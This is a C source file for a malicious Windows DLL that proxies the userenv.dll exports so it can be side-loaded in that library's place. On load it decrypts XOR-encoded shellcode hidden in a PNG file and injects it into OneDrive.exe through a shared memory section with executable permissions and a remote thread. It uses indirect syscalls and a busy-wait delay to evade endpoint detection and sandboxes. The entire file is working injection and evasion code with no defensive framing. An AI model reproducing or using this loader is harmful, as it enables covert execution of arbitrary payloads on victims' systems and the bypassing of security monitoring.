// dllmain.c : Defines the entry point for the DLL application.
#include "windows.h"
#include "Defines.h"
#include "RecycleGate.h"
#include "stdio.h"

#define STATUS_SUCCESS 0

extern void PrepareSyscall(DWORD dwSycallNr, PVOID dw64Gate);
extern DoSyscall();

#pragma comment(linker,"/export:AreThereVisibleLogoffScripts=C:\\windows\\system32\\userenv.AreThereVisibleLogoffScripts,@106")
#pragma comment(linker,"/export:AreThereVisibleShutdownScripts=C:\\windows\\system32\\userenv.AreThereVisibleShutdownScripts,@107")
#pragma comment(linker,"/export:CreateAppContainerProfile=C:\\windows\\system32\\userenv.CreateAppContainerProfile,@108")
#pragma comment(linker,"/export:CreateEnvironmentBlock=C:\\windows\\system32\\userenv.CreateEnvironmentBlock,@109")
#pragma comment(linker,"/export:CreateProfile=C:\\windows\\system32\\userenv.CreateProfile,@110")
#pragma comment(linker,"/export:DeleteAppContainerProfile=C:\\windows\\system32\\userenv.DeleteAppContainerProfile,@111")
#pragma comment(linker,"/export:DeleteProfileA=C:\\windows\\system32\\userenv.DeleteProfileA,@112")
#pragma comment(linker,"/export:DeleteProfileW=C:\\windows\\system32\\userenv.DeleteProfileW,@113")
#pragma comment(linker,"/export:DeriveAppContainerSidFromAppContainerName=C:\\windows\\system32\\userenv.DeriveAppContainerSidFromAppContainerName,@114")
#pragma comment(linker,"/export:DeriveRestrictedAppContainerSidFromAppContainerSidAndRestrictedName=C:\\windows\\system32\\userenv.DeriveRestrictedAppContainerSidFromAppContainerSidAndRestrictedName,@115")
#pragma comment(linker,"/export:DestroyEnvironmentBlock=C:\\windows\\system32\\userenv.DestroyEnvironmentBlock,@116")
#pragma comment(linker,"/export:DllCanUnloadNow=C:\\windows\\system32\\userenv.DllCanUnloadNow,@117")
#pragma comment(linker,"/export:DllGetClassObject=C:\\windows\\system32\\userenv.DllGetClassObject,@118")
#pragma comment(linker,"/export:DllRegisterServer=C:\\windows\\system32\\userenv.DllRegisterServer,@119")
#pragma comment(linker,"/export:DllUnregisterServer=C:\\windows\\system32\\userenv.DllUnregisterServer,@120")
#pragma comment(linker,"/export:EnterCriticalPolicySection=C:\\windows\\system32\\userenv.EnterCriticalPolicySection,@121")
#pragma comment(linker,"/export:ExpandEnvironmentStringsForUserA=C:\\windows\\system32\\userenv.ExpandEnvironmentStringsForUserA,@123")
#pragma comment(linker,"/export:ExpandEnvironmentStringsForUserW=C:\\windows\\system32\\userenv.ExpandEnvironmentStringsForUserW,@124")
#pragma comment(linker,"/export:ForceSyncFgPolicy=C:\\windows\\system32\\userenv.ForceSyncFgPolicy,@125")
#pragma comment(linker,"/export:FreeGPOListA=C:\\windows\\system32\\userenv.FreeGPOListA,@126")
#pragma comment(linker,"/export:FreeGPOListW=C:\\windows\\system32\\userenv.FreeGPOListW,@127")
#pragma comment(linker,"/export:GenerateGPNotification=C:\\windows\\system32\\userenv.GenerateGPNotification,@128")
#pragma comment(linker,"/export:GetAllUsersProfileDirectoryA=C:\\windows\\system32\\userenv.GetAllUsersProfileDirectoryA,@129")
#pragma comment(linker,"/export:GetAllUsersProfileDirectoryW=C:\\windows\\system32\\userenv.GetAllUsersProfileDirectoryW,@130")
#pragma comment(linker,"/export:GetAppContainerFolderPath=C:\\windows\\system32\\userenv.GetAppContainerFolderPath,@131")
#pragma comment(linker,"/export:GetAppContainerRegistryLocation=C:\\windows\\system32\\userenv.GetAppContainerRegistryLocation,@132")
#pragma comment(linker,"/export:GetAppliedGPOListA=C:\\windows\\system32\\userenv.GetAppliedGPOListA,@133")
#pragma comment(linker,"/export:GetAppliedGPOListW=C:\\windows\\system32\\userenv.GetAppliedGPOListW,@134")
#pragma comment(linker,"/export:GetDefaultUserProfileDirectoryA=C:\\windows\\system32\\userenv.GetDefaultUserProfileDirectoryA,@136")
#pragma comment(linker,"/export:GetDefaultUserProfileDirectoryW=C:\\windows\\system32\\userenv.GetDefaultUserProfileDirectoryW,@138")
#pragma comment(linker,"/export:GetGPOListA=C:\\windows\\system32\\userenv.GetGPOListA,@140")
#pragma comment(linker,"/export:GetGPOListW=C:\\windows\\system32\\userenv.GetGPOListW,@141")
#pragma comment(linker,"/export:GetNextFgPolicyRefreshInfo=C:\\windows\\system32\\userenv.GetNextFgPolicyRefreshInfo,@142")
#pragma comment(linker,"/export:GetPreviousFgPolicyRefreshInfo=C:\\windows\\system32\\userenv.GetPreviousFgPolicyRefreshInfo,@143")
#pragma comment(linker,"/export:GetProfileType=C:\\windows\\system32\\userenv.GetProfileType,@144")
#pragma comment(linker,"/export:GetProfilesDirectoryA=C:\\windows\\system32\\userenv.GetProfilesDirectoryA,@145")
#pragma comment(linker,"/export:GetProfilesDirectoryW=C:\\windows\\system32\\userenv.GetProfilesDirectoryW,@146")
#pragma comment(linker,"/export:GetUserProfileDirectoryA=C:\\windows\\system32\\userenv.GetUserProfileDirectoryA,@147")
#pragma comment(linker,"/export:GetUserProfileDirectoryW=C:\\windows\\system32\\userenv.GetUserProfileDirectoryW,@148")
#pragma comment(linker,"/export:HasPolicyForegroundProcessingCompleted=C:\\windows\\system32\\userenv.HasPolicyForegroundProcessingCompleted,@149")
#pragma comment(linker,"/export:LeaveCriticalPolicySection=C:\\windows\\system32\\userenv.LeaveCriticalPolicySection,@150")
#pragma comment(linker,"/export:LoadProfileExtender=C:\\windows\\system32\\userenv.LoadProfileExtender,@151")
#pragma comment(linker,"/export:LoadUserProfileA=C:\\windows\\system32\\userenv.LoadUserProfileA,@152")
#pragma comment(linker,"/export:LoadUserProfileW=C:\\windows\\system32\\userenv.LoadUserProfileW,@153")
#pragma comment(linker,"/export:ProcessGroupPolicyCompleted=C:\\windows\\system32\\userenv.ProcessGroupPolicyCompleted,@154")
#pragma comment(linker,"/export:ProcessGroupPolicyCompletedEx=C:\\windows\\system32\\userenv.ProcessGroupPolicyCompletedEx,@155")
#pragma comment(linker,"/export:RefreshPolicy=C:\\windows\\system32\\userenv.RefreshPolicy,@156")
#pragma comment(linker,"/export:RefreshPolicyEx=C:\\windows\\system32\\userenv.RefreshPolicyEx,@157")
#pragma comment(linker,"/export:RegisterGPNotification=C:\\windows\\system32\\userenv.RegisterGPNotification,@158")
#pragma comment(linker,"/export:RsopAccessCheckByType=C:\\windows\\system32\\userenv.RsopAccessCheckByType,@159")
#pragma comment(linker,"/export:RsopFileAccessCheck=C:\\windows\\system32\\userenv.RsopFileAccessCheck,@160")
#pragma comment(linker,"/export:RsopLoggingEnabled=C:\\windows\\system32\\userenv.RsopLoggingEnabled,@105")
#pragma comment(linker,"/export:RsopResetPolicySettingStatus=C:\\windows\\system32\\userenv.RsopResetPolicySettingStatus,@161")
#pragma comment(linker,"/export:RsopSetPolicySettingStatus=C:\\windows\\system32\\userenv.RsopSetPolicySettingStatus,@162")
#pragma comment(linker,"/export:UnloadProfileExtender=C:\\windows\\system32\\userenv.UnloadProfileExtender,@163")
#pragma comment(linker,"/export:UnloadUserProfile=C:\\windows\\system32\\userenv.UnloadUserProfile,@164")
#pragma comment(linker,"/export:UnregisterGPNotification=C:\\windows\\system32\\userenv.UnregisterGPNotification,@165")
#pragma comment(linker,"/export:WaitForMachinePolicyForegroundProcessing=C:\\windows\\system32\\userenv.WaitForMachinePolicyForegroundProcessing,@166")
#pragma comment(linker,"/export:WaitForUserPolicyForegroundProcessing=C:\\windows\\system32\\userenv.WaitForUserPolicyForegroundProcessing,@167")

char key[] = "muisdfh78934hfn438sdnfjkv";


void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j;

    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

void sleep()
{
    for (int i = 0; i <= 500000; i++)
    {
        for (int j = 2; j <= i / 2; j++)
        {
            if (i % j == 0)
            {
                break;
            }
        }
    }
}

HANDLE findTarget(char* target)
{
    NTSTATUS status;
    PVOID buffer;
    PSYSTEM_PROCESS_INFO spi;

    buffer = VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // We need to allocate a large buffer because the process list can be large.

    if (!buffer)
    {
        return -1;
    }

    spi = (PSYSTEM_PROCESS_INFO)buffer;

    Syscall sysNtQuerySystemInformation = { 0x00 };
    DWORD dwSuccess = FAIL;

    dwSuccess = getSyscall(0xaf0d30ec, &sysNtQuerySystemInformation);
    if (dwSuccess == FAIL)
        return 0x01;

    PrepareSyscall(sysNtQuerySystemInformation.dwSyscallNr, sysNtQuerySystemInformation.pRecycledGate);
    if (!NT_SUCCESS(status = DoSyscall(SystemProcessInformation, spi, 1024 * 1024, NULL)))
    {
        VirtualFree(buffer, 0, MEM_RELEASE);
        return -1;
    }

    while (spi->NextEntryOffset) // Loop over the list until we reach the last entry.
    {
        wchar_t pName[256];
        memset(pName, 0, sizeof(pName));
        WideCharToMultiByte(CP_ACP, 0, spi->ImageName.Buffer, spi->ImageName.Length, (LPSTR)pName, sizeof(pName), NULL, NULL);

        int result = my_strcmp(target, (char*)pName);
        if (!result) {
            HANDLE pid = (HANDLE)spi->ProcessId;
            VirtualFree(buffer, 0, MEM_RELEASE); // Free the allocated buffer.
            return pid;
        }

        spi = (PSYSTEM_PROCESS_INFO)((LPBYTE)spi + spi->NextEntryOffset); // Calculate the address of the next entry.

    }
    VirtualFree(buffer, 0, MEM_RELEASE); // Free the allocated buffer.
    return 0;
}


PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
    char* d = (char*)dest;
    char* s = (char*)src;
    if (d < s)
        while (len--)
            *d++ = *s++;
    else {
        char* lasts = s + (len - 1);
        char* lastd = d + (len - 1);
        while (len--)
            *lastd-- = *lasts--;
    }
    return dest;
}


int ProxyFunction()
{
    HANDLE file = NULL;
    DWORD fileSize = NULL;
    DWORD bytesRead = NULL;
    LPVOID fileData = NULL;
    
    // Reading our encrypted shellcode
    file = CreateFileA("maor.png", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        return 1;
    }
    fileSize = GetFileSize(file, NULL);
    fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
    ReadFile(file, fileData, fileSize, &bytesRead, NULL);
    unsigned char* shellcode = (unsigned char*)fileData;

    HANDLE Entry = findTarget("OneDrive.exe"); // Targeting the OneDrive.exe process
    Syscall sysZwOpenProcess = { 0x0 };
    NTSTATUS dwSuccess = FAIL;
    HANDLE hProc = 0;
    
    dwSuccess = getSyscall(0xda1009c3, &sysZwOpenProcess);
    if (dwSuccess == FAIL)
        return 0x01;
    
    OBJECT_ATTRIBUTES oa;
    CLIENT_ID cid = { (HANDLE)Entry, NULL };
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    PrepareSyscall(sysZwOpenProcess.dwSyscallNr, sysZwOpenProcess.pRecycledGate);
    DoSyscall(&hProc, PROCESS_ALL_ACCESS, &oa, &cid);

    if (hProc != NULL)
    {
        Syscall sysZwCreateSection = { 0x0 };
        Syscall sysNtMapViewOfSection = { 0x0 };
        Syscall sysNtCreateThreadEx = { 0x0 };
        Syscall sysNtResumeThread = { 0x0 };
        Syscall sysNtDelayExeuction = { 0x0 };

        DWORD dwSuccess = FAIL;
        // Prepare the syscalls
        dwSuccess = getSyscall(0x6805b1fb, &sysZwCreateSection);
        if (dwSuccess == FAIL)
            return 0x01;

        dwSuccess = getSyscall(0x625d5a2e, &sysNtMapViewOfSection);
        if (dwSuccess == FAIL)
            return 0x01;

        dwSuccess = getSyscall(0x8a4e6274, &sysNtCreateThreadEx);
        if (dwSuccess == FAIL)
            return 0x01;

        dwSuccess = getSyscall(0x6d397e74, &sysNtResumeThread);
        if (dwSuccess == FAIL)
            return 0x01;

        SIZE_T shellcodeSize = fileSize;
        HANDLE hSection = NULL;
        NTSTATUS status = NULL;
        SIZE_T size = fileSize;
        LARGE_INTEGER sectionSize = { size };
        PVOID pLocalView = NULL, pRemoteView = NULL;
        int viewUnMap = 2;

        XOR((char*)shellcode, shellcodeSize, key, sizeof(key));

        PrepareSyscall(sysZwCreateSection.dwSyscallNr, sysZwCreateSection.pRecycledGate);
        if ((status = DoSyscall(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS) {
            return -1;
        }


        PrepareSyscall(sysNtMapViewOfSection.dwSyscallNr, sysNtMapViewOfSection.pRecycledGate);
        if ((status = DoSyscall(hSection, GetCurrentProcess(),
            &pLocalView, NULL, NULL, NULL,
            (PULONG)&size, (SECTION_INHERIT)viewUnMap, NULL, PAGE_READWRITE)) != STATUS_SUCCESS) {
            return -1;
        }


        VxMoveMemory(pLocalView, shellcode, shellcodeSize);

        PrepareSyscall(sysNtMapViewOfSection.dwSyscallNr, sysNtMapViewOfSection.pRecycledGate);
        if ((status = DoSyscall(hSection, hProc, &pRemoteView, NULL, NULL, NULL,
            (PULONG)&size, (SECTION_INHERIT)viewUnMap, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS) {
            return -1;
        }
        
        
        HANDLE hHostThread = INVALID_HANDLE_VALUE;
        PrepareSyscall(sysNtCreateThreadEx.dwSyscallNr, sysNtCreateThreadEx.pRecycledGate);
        if (( status = DoSyscall(&hHostThread, THREAD_ALL_ACCESS, &oa, hProc, (LPTHREAD_START_ROUTINE)pRemoteView, pRemoteView, FALSE, 0, 0, 0, NULL)) != STATUS_SUCCESS)
        {
            return -1;
        }
       
        PrepareSyscall(sysNtResumeThread.dwSyscallNr, sysNtResumeThread.pRecycledGate);
        DoSyscall(hHostThread);
    }
    return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        ProxyFunction();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

